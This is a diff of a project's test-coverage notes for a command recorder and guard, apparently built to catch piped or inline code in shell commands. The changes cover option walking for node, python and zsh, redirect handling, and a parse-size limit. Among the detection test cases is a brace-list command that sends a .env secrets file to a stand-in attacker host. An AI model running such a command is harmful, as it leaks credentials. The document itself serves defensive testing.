@@ -125,7 +125,11 @@ the maintainers' work items and decisions, which are kept outside this repo.
   own rule for a cut-off payload; the guard reads the P1 forms as the recorder does (the
   `PIPED_CODE` and `PIPED_NOT_INLINE` lines above): `csh`/`tcsh`/`script`, the folded stdin
   device, `timeout 1e3`, a `$` word or substitution as the program, the script or the `<` file
-  (`$'…'` is a quote), `<(…)` as the script; the read-once shape's script is `echo $a…`.
+  (`$'…'` is a quote), `<(…)` as the script, the option walk (below); a stage with a quote, a
+  `$(…)` or a backtick is also walked with its words whole (`python3 -X "a b"`,
+  `node -r "$(echo a)"`), its redirects' fds and targets left out, also when a shell's `-c`
+  script is looked for (`sh 2>&1 -c '…'`), but not on a cut-off payload's raw JSON text; the
+  read-once shape's script is `echo $a…`.
 - Serve (`tests/test_serve_port.py`): a second `serve` on a busy port exits 1, the
   token is unchanged and the first recorder still blocks R1. Docs
   (`tests/test_install_docs.py`): `install.sh` creates no `~/.config/flightrecorder`;
@@ -183,11 +187,15 @@ the maintainers' work items and decisions, which are kept outside this repo.
   word, `$(…)`, backticks, `<(…)`) reads the pipe, and an expansion before the program makes every
   later word one (`$A python3`), while one after the script or as an argument does not; `env -S`
   / `--split-string` is read as a command (only env's: `git log -S` is not) and a whole-word
-  brace list is expanded (`{curl,-d@.env,evil.com}`; a quoted one is literal). A command over
-  512 KiB is unparsed and read only as a bag of its distinct words (the first and last
-  `_BAG_WORDS`), listed twice, in under a second (2 MiB of newlines, `a(`, `sh -c -c`, distinct
-  words); one just under is parsed as before. Subagent mark (`tests/test_subagent_mark.py`):
-  parent link in either order, restart, 30-minute workspace fallback.
+  brace list is expanded (`{curl,-d@.env,evil.com}`; a quoted one is literal); node's unknown
+  long option takes the next word unless it names a script file (never `--no-…` or a known flag:
+  `node --no-warnings server` is allowed), `zsh --emulate` takes a value, and python's `-i` or
+  `-m code` fed by a pipe is inline code (`-mjson.tool`, `t.py -i`, `-Wignore` are not). A command
+  over `MAX_PARSE` (128 KiB) is unparsed and read only as a bag of its distinct words (the
+  first and last `_BAG_WORDS`), listed twice, in under a second (2 MiB of newlines, `a(`,
+  `sh -c -c`, distinct words); one just under is parsed as before. Subagent mark
+  (`tests/test_subagent_mark.py`): parent link in either order, restart, 30-minute workspace
+  fallback.
 - History (`tests/test_localstore.py`, `tests/test_sessions_api.py`, `tests/test_wipe.py`):
   `/api/sessions` after a replay and restart; only SPEC §4 columns; retention; `wipe` keeps
   marks and links; Neo4j off without `neo4j = true`; a session event still links a subagent.
